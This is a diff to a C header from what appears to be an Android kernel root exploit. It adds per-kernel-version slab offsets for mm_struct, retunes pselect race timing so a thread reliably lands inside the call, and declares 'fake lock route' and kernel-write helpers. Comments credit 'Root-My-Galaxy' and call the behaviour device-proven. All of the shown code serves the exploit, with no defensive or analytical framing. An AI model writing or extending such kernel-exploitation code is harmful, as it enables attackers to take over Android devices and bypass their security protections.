@@ -42,8 +42,15 @@
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SKB_DATA_DELTA (-0xe80LL)
-
 #define MM_STRUCT_SZ 0x500
+
+/* mm_struct stride: 6.6 GKI default above; 6.1 entries override at
+ * runtime; android14-6.1 KMI SLUB stride is 0x400, not the BTF size 0x3c0. */
+#define mm_struct_sz()                                                        \
+  (active_offsets && active_offsets->mm_struct_sz                             \
+       ? active_offsets->mm_struct_sz                                         \
+       : MM_STRUCT_SZ)
+
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 extern int g_core_main;
@@ -79,10 +86,19 @@ extern int g_core_consumer;
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
 #define PSELECT_ENTER_DELAY_USEC 50000
+/* Timeout per waiter layout. 6.6 (select) keeps the proven {0, 200ms}.
+ * 6.1 compact (pselect) uses {1, 0}. The long window guarantees the
+ * consumer's 50ms enter delay always lands inside the pselect call even
+ * when crafted fd bits make it return early (Root-My-Galaxy slide_app.c behavior,
+ * device-proven). The pselect path below re-derives these from
+ * the active offsets; the macros remain the 6.6 defaults so that route
+ * is untouched. */
 #ifndef PSELECT_TIMEOUT_SEC
 #define PSELECT_TIMEOUT_SEC 0
 #endif
+#ifndef PSELECT_TIMEOUT_USEC
 #define PSELECT_TIMEOUT_USEC 200000
+#endif
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 1
 #endif
@@ -186,10 +202,12 @@ uintptr_t prepare_good_kernel_page(void);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
+int tcp_route_selected(void);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
+void do_tcp_fake_lock_route(void);
 void reset_main_route_state(void);
 int run_main_route_threads(void);
 void set_pselect_write_mode(uintptr_t target, int mode);
